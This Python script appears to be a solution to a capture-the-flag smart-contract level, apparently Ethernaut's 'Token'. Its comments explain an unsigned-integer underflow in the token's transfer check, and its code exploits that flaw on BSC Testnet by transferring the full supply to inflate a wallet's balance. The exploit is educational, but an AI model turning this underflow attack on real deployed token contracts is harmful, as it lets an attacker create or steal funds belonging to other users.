# The flaw of the token contract is a much more hidden one than the challenges before
# in this contract the require check sees if the msg.sender balance less the transaction value 
# is higher or equal than zero. Since we are using unsigned int for the balance, when subtracting
# would make it go negative, it will be a very big number instead.


# Using web3.py library to make it easier building and signing transactions
# For this solution I had to use BSC Testnet as the hardhat local network was not able 
# to call functions between contracts.

from web3 import Web3, middleware
from web3.middleware import construct_sign_and_send_raw_middleware
from web3.middleware import geth_poa_middleware # Needed for BSC

# Util library to work with private keys and address
from eth_account import Account

# Library to read the JSONs that contains the contract ABI
import json

# Setting up the account to sign transactions.
main_account = Account.from_key("") #TODO: Include main operator PK
print("Main wallet: " + main_account.address)

# For this hack we need another wallet to send the extra funds
support_account = Account.from_key("") #TODO: Include support operator PK
print("Support wallet: " + support_account.address)

# Setting up the provider. For this solution I had to use BSC Testnet
w3Provider = Web3(Web3.HTTPProvider("https://data-seed-prebsc-1-s1.binance.org:8545"))
w3Provider.middleware_onion.inject(geth_poa_middleware, layer=0) # needed for BSC
w3Provider.middleware_onion.add(construct_sign_and_send_raw_middleware(main_account))
w3Provider.eth.default_account = main_account.address

# Gas strategy is a parameter necessary for BSC Testnet
def gas_price_strategy(web3, transaction_params):
    return Web3.toWei(10, 'gwei')

w3Provider.eth.set_gas_price_strategy(gas_price_strategy)
w3Provider.middleware_onion.add(middleware.time_based_cache_middleware)

# This solution doesn't need an attacking contract. We just need the total supply and to
# transact a transfer to our address
buildFile = open('../contracts/build/contracts/levels/Token.sol/Token.json', "r")
build = json.loads(buildFile.read())
tokenContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed contract address

# We get and print the total supply than we proceed to transfer it to us
supply = tokenContract.functions.totalSupply().call()
print("Token Supply: " + str(supply))
myBalance = tokenContract.functions.balanceOf(main_account.address).call()
print("Main wallet balance: " + str(myBalance))
myBalance = tokenContract.functions.balanceOf(support_account.address).call()
print("Support wallet balance: " + str(myBalance))
transaction = tokenContract.functions.transfer(support_account.address, supply).transact()
print(w3Provider.eth.wait_for_transaction_receipt(transaction))
myBalance = tokenContract.functions.balanceOf(main_account.address).call()
print("Main wallet balance: " + str(myBalance))
myBalance = tokenContract.functions.balanceOf(support_account.address).call()
print("Support wallet balance: " + str(myBalance))